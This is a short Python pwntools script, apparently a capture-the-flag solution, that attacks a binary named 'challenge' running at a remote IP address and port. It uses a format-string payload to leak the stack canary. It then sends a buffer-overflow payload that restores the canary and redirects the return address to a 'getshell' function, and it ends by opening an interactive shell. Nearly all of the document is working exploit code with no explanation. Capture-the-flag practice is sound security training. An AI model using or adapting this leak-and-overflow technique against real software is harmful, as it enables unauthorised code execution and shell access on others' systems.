# RazviOverflow
# Python3

from pwn import *

static_binary = ELF("./challenge")

getshell_address = p64(static_binary.symbols['getshell'])

end_of_transmission = b"\x04"

payload_1 = b"%35$lX.." + b"A"*92 + p64(0xa)
payload_2 = b"A"

#binary = process("./challenge")
binary = remote("35.234.65.24",30750)

print(binary.recv())

binary.sendline(payload_1 + end_of_transmission)
binary.sendline(payload_2 + end_of_transmission)
#binary.sendline()

response = binary.recv()

print(response)
canary = int(response.split(b'.')[0],16)
print("Canary is -> " + str(canary) + " or " + hex(canary))

payload_1 = b"A" * (0x64) + p64(0xb) + b"A"*(0xe0-0x64-0x8-0x8) 
payload_1 += p64(canary) + b"B" * 0x8 + p64(0x0040084f) + getshell_address

binary.sendline(payload_1+ end_of_transmission)
binary.sendline(payload_2+ end_of_transmission)

binary.interactive()

'''
with open("python_input", "wb") as file:
	file.write(payload_1)
	file.write(payload_2)
	file.write(payload_1)
	file.write(payload_1)
'''

